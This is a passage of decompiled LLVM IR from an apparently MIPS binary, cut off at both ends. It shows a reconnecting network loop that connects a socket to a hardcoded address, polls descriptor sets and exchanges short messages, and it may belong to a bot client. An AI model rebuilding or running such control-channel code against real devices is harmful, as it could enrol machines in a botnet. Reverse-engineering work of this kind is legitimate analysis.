  store i32 %v3_401624, i32* @v0, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v2_40163c = call i32 @function_403e84()
  store i32 %v2_40163c, i32* %v0.global-to-local, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v0_401648 = load i32, i32* @s0, align 4
  store i32 %v0_401648, i32* %a1.global-to-local, align 4
  %v3_40164c = load i32, i32* @global_var_449ba4.93, align 4
  store i32 %v3_40164c, i32* @t9, align 4
  store i32 %v2_40163c, i32* @a2, align 4
  %v3_401654 = inttoptr i32 %v0_401648 to i32*
  %v4_401654 = call i32 @function_4052b0(i32 1, i32* %v3_401654)
  store i32 %v4_401654, i32* %v0.global-to-local, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_408790.94 to i32), i32* %a1.global-to-local, align 4
  %v3_401664 = load i32, i32* @global_var_449ba4.93, align 4
  store i32 %v3_401664, i32* @t9, align 4
  store i32 1, i32* @a2, align 4
  %v4_40166c = call i32 @function_4052b0(i32 1, i32* nonnull @global_var_408790.94)
  store i32 %v4_40166c, i32* %v0.global-to-local, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v3_40167c = load i32, i32* @global_var_449bb8.61, align 4
  store i32 %v3_40167c, i32* @t9, align 4
  %v2_401684 = call i32 @function_400418(i32 2)
  store i32 %v2_401684, i32* @v0, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v3_401694 = load i32, i32* @global_var_449ab8.95, align 4
  store i32 %v3_401694, i32* @t9, align 4
  %v2_40169c = call i32 @function_406800(i32 0)
  store i32 %v2_40169c, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4016a4

dec_label_pc_4016a4:                              ; preds = %dec_label_pc_401514, %dec_label_pc_4015e8
  %v3_4016a4 = load i32, i32* @global_var_449b78.96, align 4
  store i32 %v3_4016a4, i32* @t9, align 4
  %v1_4016ac = call i32 @function_401e44()
  store i32 %v1_4016ac, i32* %v0.global-to-local, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v3_4016bc = load i32, i32* @global_var_449b08.52, align 4
  store i32 %v3_4016bc, i32* @t9, align 4
  %v2_4016c4 = call i32 @function_4002d0(i32 1)
  store i32 %v2_4016c4, i32* %v0.global-to-local, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v3_4016d4 = load i32, i32* @global_var_449c30.53, align 4
  store i32 %v3_4016d4, i32* @t9, align 4
  %v2_4016dc = call i32 @function_400564(i32 1)
  store i32 %v2_4016dc, i32* %v0.global-to-local, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v3_4016ec = load i32, i32* @global_var_449c30.53, align 4
  store i32 %v3_4016ec, i32* @t9, align 4
  store i32 %v2_4016dc, i32* @s0, align 4
  %v3_4016f4 = call i32 @function_400564(i32 1)
  store i32 %v3_4016f4, i32* @v0, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v2_40170c = call i32 @function_403e84()
  store i32 %v2_40170c, i32* %v0.global-to-local, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v0_401718 = load i32, i32* @s0, align 4
  store i32 %v0_401718, i32* %a1.global-to-local, align 4
  %v3_40171c = load i32, i32* @global_var_449ba4.93, align 4
  store i32 %v3_40171c, i32* @t9, align 4
  store i32 %v2_40170c, i32* @a2, align 4
  %v3_401724 = inttoptr i32 %v0_401718 to i32*
  %v4_401724 = call i32 @function_4052b0(i32 1, i32* %v3_401724)
  store i32 %v4_401724, i32* %v0.global-to-local, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_408790.94 to i32), i32* %a1.global-to-local, align 4
  %v3_401734 = load i32, i32* @global_var_449ba4.93, align 4
  store i32 %v3_401734, i32* @t9, align 4
  store i32 1, i32* @a2, align 4
  %v4_40173c = call i32 @function_4052b0(i32 1, i32* nonnull @global_var_408790.94)
  store i32 %v4_40173c, i32* %v0.global-to-local, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v3_40174c = load i32, i32* @global_var_449bb8.61, align 4
  store i32 %v3_40174c, i32* @t9, align 4
  %v2_401754 = call i32 @function_400418(i32 1)
  store i32 %v2_401754, i32* %v0.global-to-local, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v3_401764 = load i32, i32* @global_var_449b50.97, align 4
  store i32 %v3_401764, i32* @t9, align 4
  %v1_40176c = call i32 @function_404d80()
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v1_401778 = icmp sgt i32 %v1_40176c, 0
  store i32 0, i32* %v0.global-to-local, align 4
  br i1 %v1_401778, label %dec_label_pc_401d0c, label %dec_label_pc_40177c

dec_label_pc_40177c:                              ; preds = %dec_label_pc_4016a4
  %v3_401780 = load i32, i32* @global_var_449a80.98, align 4
  store i32 %v3_401780, i32* @t9, align 4
  %v3_401788 = ptrtoint i32* %stack_var_-1348 to i32
  store i32 %v3_401788, i32* @s0, align 4
  %v4_401788 = call i32 @function_405190()
  store i32 %v4_401788, i32* %v0.global-to-local, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v3_401798 = load i32, i32* @global_var_449a6c.60, align 4
  store i32 %v3_401798, i32* @t9, align 4
  store i32 %v4_401788, i32* @s1, align 4
  %v3_4017a0 = call i32 @function_404d20(i32 0)
  store i32 %v3_4017a0, i32* %v0.global-to-local, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v3_4017b0 = load i32, i32* @global_var_449a6c.60, align 4
  store i32 %v3_4017b0, i32* @t9, align 4
  store i32 0, i32* @s6, align 4
  %v2_4017b8 = call i32 @function_404d20(i32 2)
  store i32 %v2_4017b8, i32* %v0.global-to-local, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v3_4017c8 = load i32, i32* @global_var_449a6c.60, align 4
  store i32 %v3_4017c8, i32* @t9, align 4
  %v2_4017d0 = call i32 @function_404d20(i32 1)
  store i32 %v2_4017d0, i32* %v0.global-to-local, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  store i32 32, i32* @a2, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 %v3_401788, i32* @a0, align 4
  %v6_4017e8 = call i32 @function_403f6c(i32 %v3_401788, i32 0, i32 32)
  store i32 %v6_4017e8, i32* %v0.global-to-local, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v3_4017fc = load i32, i32* @global_var_449ac8.59, align 4
  store i32 %v3_4017fc, i32* @t9, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_408598.99 to i32), i32* %a1.global-to-local, align 4
  %v7_401804 = bitcast i32* %stack_var_-1348 to i8*
  %v8_401804 = call i32 @function_403f08(i8* %v7_401804, i32 ptrtoint ([5 x i8]* @global_var_408598.99 to i32))
  store i32 %v8_401804, i32* %v0.global-to-local, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v3_401814 = load i32, i32* @global_var_449bc4.100, align 4
  store i32 %v3_401814, i32* @t9, align 4
  %v1_40181c = call i32 @function_401d34()
  %v2_40181c = sext i32 %v1_40181c to i64
  %v5_40182c = mul nuw nsw i64 %v2_40181c, 2863311531
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v3_401838 = load i32, i32* @global_var_449bd8.101, align 4
  store i32 %v3_401838, i32* @t9, align 4
  %v1_4018402 = udiv i64 %v5_40182c, 8589934592
  %v1_401840 = trunc i64 %v1_4018402 to i32
  store i32 %v1_401840, i32* %v1.global-to-local, align 4
  %v1_4018444 = mul nuw nsw i64 %v1_4018402, 2
  %v1_401844 = trunc i64 %v1_4018444 to i32
  %v2_401848.neg = add i32 %v1_40181c, 1
  %v3_40184c = sub i32 %v2_401848.neg, %v1_401840
  %v1_401850 = sub i32 %v3_40184c, %v1_401844
  store i32 %v1_401850, i32* %v0.global-to-local, align 4
  %v2_401854 = urem i32 %v1_401850, 256
  %v4_401854 = call i32 @function_402860(i32 %v2_401854)
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v3_401864 = load i32, i32* @global_var_4499c8.2, align 4
  store i32 %v3_401864, i32* @v0, align 4
  %v3_401868 = load i32, i32* @global_var_449ad8.102, align 4
  store i32 %v3_401868, i32* @t9, align 4
  %v3_40186c = load i32, i32* @global_var_449824.6, align 4
  %v1_401870 = load i32, i32* @s1, align 4
  store i32 %v1_401870, i32* %a1.global-to-local, align 4
  %v4_401870 = call i32 @function_403c68(i32 %v3_40186c, i32 %v1_401870)
  store i32 %v4_401870, i32* %v0.global-to-local, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v2_40187c = ptrtoint i32* %stack_var_-1316 to i32
  %v2_401880 = ptrtoint i32* %stack_var_-1188 to i32
  %v2_401894 = ptrtoint i32* %stack_var_-1060 to i32
  %v2_401940 = ptrtoint i32* %stack_var_-1364 to i32
  %v4_401944 = bitcast i32* %stack_var_-1364 to %sockaddr*
  %v4_401964 = ptrtoint i16* %stack_var_-1384 to i32
  %v2_4019c4 = ptrtoint i32* %stack_var_-1372 to i32
  %v2_401aac = ptrtoint i32* %stack_var_-1376 to i32
  %v3_401ac0 = ptrtoint i32* %stack_var_-1380 to i32
  %v6_401b60 = bitcast i16* %stack_var_-1384 to i32*
  %v1_401bbc = add i32 %v1_40151c, 296360
  %v2_401bbc = inttoptr i32 %v1_401bbc to i32*
  br label %dec_label_pc_40187c

dec_label_pc_40187c:                              ; preds = %dec_label_pc_401c78, %dec_label_pc_401b88, %dec_label_pc_4018bc, %dec_label_pc_40177c
  store i32 %v2_40187c, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_401880

dec_label_pc_401880:                              ; preds = %dec_label_pc_401b94, %dec_label_pc_401afc, %dec_label_pc_40187c
  store i32 %v2_401880, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_401884

dec_label_pc_401884:                              ; preds = %dec_label_pc_401884, %dec_label_pc_401880
  %v0_401884 = phi i32 [ %v1_401888, %dec_label_pc_401884 ], [ %v2_40187c, %dec_label_pc_401880 ]
  %v1_401884 = inttoptr i32 %v0_401884 to i32*
  store i32 0, i32* %v1_401884, align 4
  %v0_401888 = load i32, i32* %v0.global-to-local, align 4
  %v1_401888 = add i32 %v0_401888, 4
  store i32 %v1_401888, i32* %v0.global-to-local, align 4
  %v1_40188c = load i32, i32* %v1.global-to-local, align 4
  %v2_40188c = icmp eq i32 %v1_401888, %v1_40188c
  br i1 %v2_40188c, label %dec_label_pc_401890, label %dec_label_pc_401884

dec_label_pc_401890:                              ; preds = %dec_label_pc_401884
  store i32 %v2_401894, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_401898

dec_label_pc_401898:                              ; preds = %dec_label_pc_401898, %dec_label_pc_401890
  %v0_401898 = phi i32 [ %v1_40189c, %dec_label_pc_401898 ], [ %v1_401888, %dec_label_pc_401890 ]
  %v1_401898 = inttoptr i32 %v0_401898 to i32*
  store i32 0, i32* %v1_401898, align 4
  %v0_40189c = load i32, i32* %v0.global-to-local, align 4
  %v1_40189c = add i32 %v0_40189c, 4
  store i32 %v1_40189c, i32* %v0.global-to-local, align 4
  %v1_4018a0 = load i32, i32* %v1.global-to-local, align 4
  %v2_4018a0 = icmp eq i32 %v1_40189c, %v1_4018a0
  br i1 %v2_4018a0, label %dec_label_pc_4018a4, label %dec_label_pc_401898

dec_label_pc_4018a4:                              ; preds = %dec_label_pc_401898
  %v0_4018a8 = load i32, i32* %gp.global-to-local, align 4
  %v1_4018a8 = add i32 %v0_4018a8, -32744
  %v2_4018a8 = inttoptr i32 %v1_4018a8 to i32*
  %v3_4018a8 = load i32, i32* %v2_4018a8, align 4
  store i32 %v3_4018a8, i32* @s2, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  %v1_4018b0 = add i32 %v3_4018a8, -26584
  %v2_4018b0 = inttoptr i32 %v1_4018b0 to i32*
  %v3_4018b0 = load i32, i32* %v2_4018b0, align 4
  store i32 %v3_4018b0, i32* %s1.global-to-local, align 4
  %v2_4018b8 = icmp eq i32 %v3_4018b0, -1
  br i1 %v2_4018b8, label %dec_label_pc_4018bc, label %dec_label_pc_401954

dec_label_pc_4018bc:                              ; preds = %dec_label_pc_4018a4
  %v1_4018c0 = add i32 %v0_4018a8, -32188
  %v2_4018c0 = inttoptr i32 %v1_4018c0 to i32*
  %v3_4018c0 = load i32, i32* %v2_4018c0, align 4
  store i32 2, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4018c0)
  %v0_4018d0 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_4018d0, i32* @s0, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v1_4018d8 = load i32, i32* %s1.global-to-local, align 4
  %v2_4018d8 = icmp eq i32 %v0_4018d0, %v1_4018d8
  %v4_4018d8 = load i32, i32* @s2, align 4
  %v5_4018d8 = add i32 %v4_4018d8, -26584
  %v6_4018d8 = inttoptr i32 %v5_4018d8 to i32*
  store i32 %v0_4018d0, i32* %v6_4018d8, align 4
  br i1 %v2_4018d8, label %dec_label_pc_40187c, label %dec_label_pc_4018dc

dec_label_pc_4018dc:                              ; preds = %dec_label_pc_4018bc
  %v3_4018e0 = load i32, i32* @global_var_449a74.80, align 4
  store i32 %v3_4018e0, i32* @t9, align 4
  store i32 3, i32* @a1, align 4
  %v1_4018ec = load i32, i32* %v0.global-to-local, align 4
  store i32 %v1_4018ec, i32* @a0, align 4
  %v2_4018ec = call i32 @function_404bc0()
  store i32 %v2_4018ec, i32* %v0.global-to-local, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v0_4018f8 = load i32, i32* @s0, align 4
  store i32 %v0_4018f8, i32* @a0, align 4
  %v3_4018fc = load i32, i32* @global_var_449a74.80, align 4
  store i32 %v3_4018fc, i32* @t9, align 4
  store i32 4, i32* @a1, align 4
  %v1_401904 = call i32 @function_404bc0()
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  store i32 1, i32* %v1.global-to-local, align 4
  %v3_401918 = load i32, i32* @global_var_449c60.86, align 4
  store i32 %v3_401918, i32* @t9, align 4
  store i8 1, i8* @global_var_449cbc.104, align 1
  store i32 2, i32* %stack_var_-1364, align 4
  store i32 -1187070888, i32* %v0.global-to-local, align 4
  %v0_401938 = load i32, i32* @s2, align 4
  %v1_401938 = add i32 %v0_401938, -26584
  %v2_401938 = inttoptr i32 %v1_401938 to i32*
  %v3_401938 = load i32, i32* %v2_401938, align 4
  store i32 %v2_401940, i32* %a1.global-to-local, align 4
  store i32 16, i32* @a2, align 4
  %v5_401944 = call i32 @function_405bf0(i32 %v3_401938, %sockaddr* %v4_401944)
  store i32 %v5_401944, i32* %v0.global-to-local, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v0_401958.pre = load i32, i32* @s2, align 4
  br label %dec_label_pc_401954

dec_label_pc_401954:                              ; preds = %dec_label_pc_4018a4, %dec_label_pc_4018dc
  %v0_401958 = phi i32 [ %v3_4018a8, %dec_label_pc_4018a4 ], [ %v0_401958.pre, %dec_label_pc_4018dc ]
  %v0_401954 = phi i32 [ %v0_4018a8, %dec_label_pc_4018a4 ], [ %v2_40151c, %dec_label_pc_4018dc ]
  %v1_401954 = add i32 %v0_401954, -32744
  %v2_401954 = inttoptr i32 %v1_401954 to i32*
  %v3_401954 = load i32, i32* %v2_401954, align 4
  store i32 %v3_401954, i32* %v0.global-to-local, align 4
  %v1_401958 = add i32 %v0_401958, -26584
  %v2_401958 = inttoptr i32 %v1_401958 to i32*
  %v3_401958 = load i32, i32* %v2_401958, align 4
  store i32 %v3_401958, i32* %a1.global-to-local, align 4
  %v1_40195c = add i32 %v3_401954, -25412
  %v2_40195c = inttoptr i32 %v1_40195c to i8*
  %v3_40195c = load i8, i8* %v2_40195c, align 1
  %v4_40195c = sext i8 %v3_40195c to i32
  store i32 %v4_40195c, i32* %v0.global-to-local, align 4
  %v1_401964 = icmp eq i8 %v3_40195c, 0
  store i32 %v4_401964, i32* %v1.global-to-local, align 4
  br i1 %v1_401964, label %dec_label_pc_401990, label %dec_label_pc_401968

dec_label_pc_401968:                              ; preds = %dec_label_pc_401954
  %v1_40196c = udiv i32 %v3_401958, 32
  %v1_401970 = mul nuw nsw i32 %v1_40196c, 4
  %v2_401974 = add i32 %v1_401970, %v4_401964
  store i32 %v2_401974, i32* %v0.global-to-local, align 4
  %v1_401978 = add i32 %v2_401974, 196
  %v2_401978 = inttoptr i32 %v1_401978 to i32*
  %v3_401978 = load i32, i32* %v2_401978, align 4
  %v2_401980 = shl i32 1, %v3_401958
  store i32 %v2_401980, i32* %v1.global-to-local, align 4
  %v2_401984 = or i32 %v3_401978, %v2_401980
  store i32 %v2_401984, i32* %v2_401978, align 4
  %v0_401990.pre = load i32, i32* %a1.global-to-local, align 4
  %v1_401998.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_401990

dec_label_pc_401990:                              ; preds = %dec_label_pc_401954, %dec_label_pc_401968
  %v1_401998 = phi i32 [ %v4_401964, %dec_label_pc_401954 ], [ %v1_401998.pre, %dec_label_pc_401968 ]
  %v1_4019a4 = phi i32 [ %v3_401958, %dec_label_pc_401954 ], [ %v0_401990.pre, %dec_label_pc_401968 ]
  %v1_401990 = udiv i32 %v1_4019a4, 32
  %v1_401994 = mul nuw nsw i32 %v1_401990, 4
  %v2_401998 = add i32 %v1_401994, %v1_401998
  store i32 %v2_401998, i32* %v0.global-to-local, align 4
  %v1_40199c = add i32 %v2_401998, 68
  %v2_40199c = inttoptr i32 %v1_40199c to i32*
  %v3_40199c = load i32, i32* %v2_40199c, align 4
  %v2_4019a4 = shl i32 1, %v1_4019a4
  store i32 %v2_4019a4, i32* %v1.global-to-local, align 4
  %v2_4019a8 = or i32 %v3_40199c, %v2_4019a4
  store i32 %v2_4019a8, i32* %v2_40199c, align 4
  %v0_4019b0 = load i32, i32* %gp.global-to-local, align 4
  store i32 10, i32* %v0.global-to-local, align 4
  %v1_4019bc = add i32 %v0_4019b0, -32192
  %v2_4019bc = inttoptr i32 %v1_4019bc to i32*
  %v3_4019bc = load i32, i32* %v2_4019bc, align 4
  store i32 10, i32* %stack_var_-1372, align 4
  store i32 %v2_4019c4, i32* %v0.global-to-local, align 4
  store i32 %v2_40187c, i32* %a1.global-to-local, align 4
  store i32 0, i32* @a3, align 4
  call void @__pseudo_call(i32 %v3_4019bc)
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v3_401a50 = load i32, i32* @global_var_4499c8.2, align 4
  store i32 %v3_401a50, i32* %v1.global-to-local, align 4
  %v3_401a58 = load i8, i8* @global_var_449cbc.104, align 1
  %v4_401a58 = sext i8 %v3_401a58 to i32
  store i32 %v4_401a58, i32* %v0.global-to-local, align 4
  %v1_401a60 = icmp eq i8 %v3_401a58, 0
  store i32 -1, i32* %s5.global-to-local, align 4
  %v3_401b88.pre = load i32, i32* @global_var_449828.107, align 4
  br i1 %v1_401a60, label %dec_label_pc_401b88, label %dec_label_pc_401a64

dec_label_pc_401a64:                              ; preds = %dec_label_pc_401990
  %v1_401a70 = udiv i32 %v3_401b88.pre, 32
  %v1_401a74 = mul nuw nsw i32 %v1_401a70, 4
  %v2_401a78 = add i32 %v1_401a74, %v4_401964
  store i32 %v2_401a78, i32* %v0.global-to-local, align 4
  %v1_401a7c = add i32 %v2_401a78, 196
  %v2_401a7c = inttoptr i32 %v1_401a7c to i32*
  %v3_401a7c = load i32, i32* %v2_401a7c, align 4
  %v2_401a846 = lshr i32 %v3_401a7c, %v3_401b88.pre
  %v1_401a88 = urem i32 %v2_401a846, 2
  store i32 %v1_401a88, i32* %v0.global-to-local, align 4
  %v1_401a8c = icmp eq i32 %v1_401a88, 0
  store i8 0, i8* @global_var_449cbc.104, align 1
  br i1 %v1_401a8c, label %dec_label_pc_401a90, label %dec_label_pc_401aa0

dec_label_pc_401a90:                              ; preds = %dec_label_pc_401a64
  br label %dec_label_pc_401aa0

dec_label_pc_401aa0:                              ; preds = %dec_label_pc_401a64, %dec_label_pc_401a90
  %v3_401aa4 = load i32, i32* @global_var_449ae0.108, align 4
  store i32 %v3_401aa4, i32* @t9, align 4
  store i32 4, i32* %stack_var_-1376, align 4
  store i32 %v2_401aac, i32* %v0.global-to-local, align 4
  store i32 0, i32* %stack_var_-1380, align 4
  store i32 65535, i32* %a1.global-to-local, align 4
  store i32 %v3_401ac0, i32* @a3, align 4
  %v7_401ac0 = call i32 @function_405cb0(i32 65535, i32 4103, i32 %v3_401ac0)
  %v3_401ac8 = load i32, i32* %stack_var_-1380, align 4
  store i32 %v3_401ac8, i32* @v0, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v1_401ad0 = icmp eq i32 %v3_401ac8, 0
  store i32 %v3_401788, i32* @s0, align 4
  br i1 %v1_401ad0, label %dec_label_pc_401afc, label %dec_label_pc_401ad4

dec_label_pc_401ad4:                              ; preds = %dec_label_pc_401aa0
  %v3_401ad8 = load i32, i32* @global_var_449a6c.60, align 4
  store i32 %v3_401ad8, i32* @t9, align 4
  %v3_401adc = load i32, i32* @global_var_449828.107, align 4
  %v2_401ae0 = call i32 @function_404d20(i32 %v3_401adc)
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  store i32 -1, i32* @v0, align 4
  store i32 -1, i32* @global_var_449828.107, align 4
  br label %dec_label_pc_401afc

dec_label_pc_401afc:                              ; preds = %dec_label_pc_401aa0, %dec_label_pc_401ad4
  %v3_401b04 = call i32 @function_403e84()
  %v4_401b04 = trunc i32 %v3_401b04 to i16
  store i32 %v3_401b04, i32* %v0.global-to-local, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v3_401b14 = load i32, i32* @global_var_449c3c.92, align 4
  store i32 %v3_401b14, i32* @t9, align 4
  store i16 %v4_401b04, i16* %stack_var_-1384, align 2
  %v9_401b1c = call i32 @function_404448()
  store i32 %v9_401b1c, i32* %v0.global-to-local, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v3_401b28 = load i32, i32* @global_var_449828.107, align 4
  %v3_401b2c = load i32, i32* @global_var_449c40, align 4
  store i32 %v3_401b2c, i32* %v1.global-to-local, align 4
  %v3_401b34 = load i32, i32* @global_var_449bd0.106, align 4
  store i32 %v3_401b34, i32* @t9, align 4
  %v2_401b38 = inttoptr i32 %v3_401b2c to i32*
  store i32 %v9_401b1c, i32* %v2_401b38, align 4
  store i32 ptrtoint (i32* @global_var_4085a0.109 to i32), i32* %a1.global-to-local, align 4
  %v7_401b44 = call i32 @function_405e70(i32 %v3_401b28, i32* nonnull @global_var_4085a0.109, i32 4, i32 16384, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_401b44, i32* %v0.global-to-local, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v3_401b50 = load i32, i32* @global_var_449828.107, align 4
  %v3_401b54 = load i32, i32* @global_var_449bd0.106, align 4
  store i32 %v3_401b54, i32* @t9, align 4
  store i32 %v4_401964, i32* %a1.global-to-local, align 4
  %v7_401b60 = call i32 @function_405e70(i32 %v3_401b50, i32* %v6_401b60, i32 1, i32 16384, i32 ptrtoint (i32* @0 to i32))
  %v3_401b68 = load i16, i16* %stack_var_-1384, align 2
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v1_401b70 = icmp eq i16 %v3_401b68, 0
  store i32 %v2_40187c, i32* %v0.global-to-local, align 4
  br i1 %v1_401b70, label %dec_label_pc_401880, label %dec_label_pc_401b74

dec_label_pc_401b74:                              ; preds = %dec_label_pc_401afc
  %v3_401b78 = load i32, i32* @global_var_449828.107, align 4
  store i32 %v3_401788, i32* %a1.global-to-local, align 4
  %v1_401b90.pre = load i32, i32* %s5.global-to-local, align 4
  br label %dec_label_pc_401b88

dec_label_pc_401b88:                              ; preds = %dec_label_pc_401990, %dec_label_pc_401b74
  %v1_401b90 = phi i32 [ %v1_401b90.pre, %dec_label_pc_401b74 ], [ -1, %dec_label_pc_401990 ]
  %v1_401bac = phi i32 [ %v3_401b78, %dec_label_pc_401b74 ], [ %v3_401b88.pre, %dec_label_pc_401990 ]
  store i32 %v1_401bac, i32* @s0, align 4
  %v2_401b90 = icmp eq i32 %v1_401bac, %v1_401b90
  %v4_401b90 = udiv i32 %v1_401bac, 32
  store i32 %v4_401b90, i32* %v0.global-to-local, align 4
  br i1 %v2_401b90, label %dec_label_pc_40187c, label %dec_label_pc_401b94

dec_label_pc_401b94:                              ; preds = %dec_label_pc_401b88
  %v1_401b98 = mul nuw nsw i32 %v4_401b90, 4
  %v2_401ba0 = add i32 %v1_401b98, %v4_401964
  store i32 %v2_401ba0, i32* %v0.global-to-local, align 4
  %v1_401ba4 = add i32 %v2_401ba0, 68
  %v2_401ba4 = inttoptr i32 %v1_401ba4 to i32*
  %v3_401ba4 = load i32, i32* %v2_401ba4, align 4
  %tmp61 = shl i32 1, %v1_401bac
  %v1_401bb08 = and i32 %v3_401ba4, %tmp61
  %v1_401bb4 = icmp eq i32 %v1_401bb08, 0
  store i32 %v2_40187c, i32* %v0.global-to-local, align 4
  br i1 %v1_401bb4, label %dec_label_pc_401880, label %dec_label_pc_401bb8

dec_label_pc_401bb8:                              ; preds = %dec_label_pc_401b94
  %v3_401bbc = load i32, i32* %v2_401bbc, align 4
  store i16 0, i16* %stack_var_-1384, align 2
  call void @__pseudo_call(i32 %v3_401bbc)
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v0_401bd0 = load i32, i32* @s0, align 4
  %v3_401bd4 = load i32, i32* @global_var_449c64.110, align 4
  store i32 %v3_401bd4, i32* @t9, align 4
  store i32 0, i32* %stack_var_-1316, align 4
  store i32 %v4_401964, i32* %a1.global-to-local, align 4
  %v9_401be8 = call i32 @function_405d90(i32 %v0_401bd0, i32* %v6_401b60, i32 2, i32 16386, i32 0)
  store i32 %v9_401be8, i32* %v0.global-to-local, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v1_401bf4 = load i32, i32* %s5.global-to-local, align 4
  %v2_401bf4 = icmp eq i32 %v9_401be8, %v1_401bf4
  br i1 %v2_401bf4, label %dec_label_pc_401c78, label %dec_label_pc_401bf8

dec_label_pc_401bf8:                              ; preds = %dec_label_pc_401bb8
  %v1_401bfc = icmp eq i32 %v9_401be8, 0
  br i1 %v1_401bfc, label %dec_label_pc_401ca0, label %dec_label_pc_401c00

dec_label_pc_401c00:                              ; preds = %dec_label_pc_401bf8
  %v3_401c04 = load i16, i16* %stack_var_-1384, align 2
  %v1_401c0c = icmp eq i16 %v3_401c04, 0
  %v3_401c0c = icmp ult i16 %v3_401c04, 1025
  %v4_401c0c = zext i1 %v3_401c0c to i32
  store i32 %v4_401c0c, i32* %v0.global-to-local, align 4
  br i1 %v1_401c0c, label %dec_label_pc_401c10, label %dec_label_pc_401c28

dec_label_pc_401c10:                              ; preds = %dec_label_pc_401c00
  store i32 %v4_401964, i32* %a1.global-to-local, align 4
  br label %dec_label_pc_401c28

dec_label_pc_401c28:                              ; preds = %dec_label_pc_401c00, %dec_label_pc_401c10
  %v1_401c28 = icmp eq i1 %v3_401c0c, false
  store i32 %v2_401894, i32* @s0, align 4
  br i1 %v1_401c28, label %dec_label_pc_401c2c, label %dec_label_pc_401c28.dec_label_pc_401c54_crit_edge

dec_label_pc_401c28.dec_label_pc_401c54_crit_edge: ; preds = %dec_label_pc_401c28
  %v3_401c5c.pre = load i32, i32* @global_var_449828.107, align 4
  br label %dec_label_pc_401c54

dec_label_pc_401c2c:                              ; preds = %dec_label_pc_401c28
  %v3_401c30 = load i32, i32* @global_var_449a6c.60, align 4
  store i32 %v3_401c30, i32* @t9, align 4
  %v3_401c34 = load i32, i32* @global_var_449828.107, align 4
  %v2_401c38 = call i32 @function_404d20(i32 %v3_401c34)
  store i32 %v2_401c38, i32* %v0.global-to-local, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v0_401c50 = load i32, i32* %s5.global-to-local, align 4
  store i32 %v0_401c50, i32* @global_var_449828.107, align 4
  br label %dec_label_pc_401c54

dec_label_pc_401c54:                              ; preds = %dec_label_pc_401c28.dec_label_pc_401c54_crit_edge, %dec_label_pc_401c2c
  %v3_401c5c = phi i32 [ %v3_401c5c.pre, %dec_label_pc_401c28.dec_label_pc_401c54_crit_edge ], [ %v0_401c50, %dec_label_pc_401c2c ]
  store i32 0, i32* %stack_var_-1316, align 4
  %v3_401c58 = load i32, i32* @global_var_449c64.110, align 4
  store i32 %v3_401c58, i32* @t9, align 4
  store i32 %v2_401894, i32* %a1.global-to-local, align 4
  %v7_401c64 = call i32 @function_405d90(i32 %v3_401c5c, i32* nonnull %stack_var_-1060, i32 16386, i32 16386, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_401c64, i32* %v0.global-to-local, align 4
  store i32 %v2_40151c, i32* %gp.global-to-local, align 4
  %v1_401c70 = load i32, i32* %s5.global-to-local, align 4
  %v2_401c70 = icmp eq i32 %v7_401c64, %v1_401c70
  br i1 %v2_401c70, label %dec_label_pc_401c78, label %dec_label_pc_401c98

dec_label_pc_401c78:                              ; preds = %dec_label_pc_401c54, %dec_label_pc_401bb8
  %v2_401c78 = load i32, i32* %stack_var_-1316, align 4
  store i32 %v2_401c78, i32* %v1.global-to-local, align 4
  %v2_401c80 = icmp eq i32 %v2_401c78, 11
  store i32 4, i32* %v0.global-to-local, align 4
  br i1 %v2_401c80, label %dec_label_pc_40187c, label %dec_label_pc_401c84

dec_label_pc_401c84:                              ; preds = %dec_label_pc_401c78
